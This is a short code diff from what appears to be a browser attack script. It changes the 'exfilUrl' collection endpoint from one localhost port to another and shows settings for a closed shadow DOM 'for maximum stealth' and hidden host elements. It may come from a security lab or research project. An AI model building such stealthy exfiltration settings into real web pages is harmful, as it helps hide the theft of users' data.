@@ -23,7 +23,7 @@
 
     // Attack configuration
     const CONFIG = {
-        exfilUrl: 'http://localhost:3000/collect',
+        exfilUrl: 'http://localhost:9004/collect',
         debug: true,
         shadowMode: 'closed',        // Use closed shadow DOM for maximum stealth
         hiddenElements: true,        // Hide shadow host elements
